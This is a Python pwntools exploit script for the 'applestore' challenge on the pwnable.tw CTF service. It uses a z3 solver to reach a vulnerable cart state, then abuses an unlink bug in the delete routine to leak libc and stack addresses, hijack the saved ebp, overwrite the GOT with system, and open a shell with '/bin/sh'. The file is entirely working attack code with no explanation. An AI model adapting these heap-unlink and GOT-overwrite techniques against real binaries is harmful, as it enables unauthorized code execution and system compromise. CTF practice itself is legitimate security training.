# !/bin/python3
from pwn import *
from z3 import *
import os
import subprocess
context.arch = 'i386'
context.terminal = ["tmux","splitw","-h"]
context.log_level = "debug"

def get_libc_addr(pid):
    cmd = f"cat /proc/{pid}/maps"+" | grep libc | head -1 | awk -F- {'print $1'}"
    addr = int(subprocess.check_output(cmd,shell=True),16) 
    print(hex(addr))
    return addr

def choice(io,ch):
    io.recvuntil(b"> ")
    io.sendline(str(ch).encode())

def add(io,idx):
    choice(io,2)
    io.recvuntil(b"Device Number> ")
    io.sendline(str(idx).encode())

def delete(io,content):
    choice(io,3)
    io.recvuntil(b"Item Number> ")
    io.send(content)
    removed_item = io.recvline()
    return removed_item.strip(b"\n")

def cart(io,content=b"y"):
    choice(io,4)
    io.recvuntil(b"Let me check your cart. ok? (y/n) > ")
    io.send(content)

def get_iphone8(io,sols,cnts):
    for i in range(len(list(cnts))):
        for j in range(sol[cnts[i]].as_long()):
            add(io, i+1)
    choice(io,5)
    io.recvuntil(b"Let me check your cart. ok? (y/n) > ")
    io.sendline(b"y")

def leak_libc(io,_bin):
    content = b"y\x00" + p32(_bin.got["puts"]) # change name to GOT['puts']
    content+= p32(114514) + p32(0) 
    cart(io,content)
    s = io.recvuntil(b"114514").split(b"\n")[-1].split(b': ')[1]
    return u32(s[:4])

def leak_stack(io):
    for i in range(26):
        delete(io, b"1\x00")
    first_cart_ptr = 0x804B070
    content = b"1\x00"
    content+= p32(first_cart_ptr)   # name
    content+= p32(114514)           # price
    content+= p32(0)                # next
    content+= p32(0)                # prev
    s = delete(io,content)
    assert s.startswith(b"Remove 1:")
    return u32(s.strip(b"Remove 1:")[:4])

def hijack_ebp(io,ori_ebp):
    content = b"1\00"
    got_start = 0x804B032
    content+= p32(got_start)        # name
    content+= p32(0)                # price
    content+= p32(ori_ebp-0xc)      # next
    content+= p32(got_start+0x22)   # prev
    delete(io, content)

def rewrite_got(io,system_addr):
    content = b"/bin/sh\00".ljust(0x40-0x32,b"\x00")
    content+= p32(system_addr)
    # delete(io, content)
    # choice(io,3)
    io.recvuntil(b"> ")
    io.send(content)

def demo_stack_rewrite(io):
    content = b"y\x00" + p32(0x080490A4) # change name to "Times Up!"
    content += p32(114514) + p32(0)
    cart(io,content)

def _solve():
    target_total = 7174
    prices = [199,299,499,399,199]
    cnts = Ints('x0 x1 x2 x3 x4')
    expr = sum(list(map(lambda x,y:x*y, prices,cnts)))
    s = Solver()
    s.add(expr == target_total)
    for sym in cnts:
        s.add(sym > 0)
    s.check()
    sol = s.model()
    print(sol)
    assert sum(map(lambda x,y: sol[x].as_long()*y, cnts, prices))==target_total, f"{sum(map(lambda x,y: sol[x].as_long()*y, cnts, prices))}"
    return sol,cnts

DEBUG = False

if __name__ =='__main__':
    if DEBUG:
        io = process("./applestore")
        # get_libc_addr(pidof(io)[0])
    else:
        io = remote("chall.pwnable.tw",10104)
    _bin = ELF("./applestore")
    libc = ELF("./libc_32.so.6")


    sol,cnts = _solve()
    get_iphone8(io,sol,cnts)
    # demo_stack_rewrite(io)
    libc.address = leak_libc(io, _bin) - libc.symbols["puts"] 
    print(f"leaked libc at {hex(libc.address)}")

    delete_ebp = leak_stack(io) + 0x20
    print(f"leaked ebp: {hex(delete_ebp)}")
    #gdb.attach(io, gdbscript="b *0x8048C08\nc\n")
    #sleep(1)
    hijack_ebp(io, delete_ebp)
    
    rewrite_got(io, libc.symbols["system"])

    io.interactive()


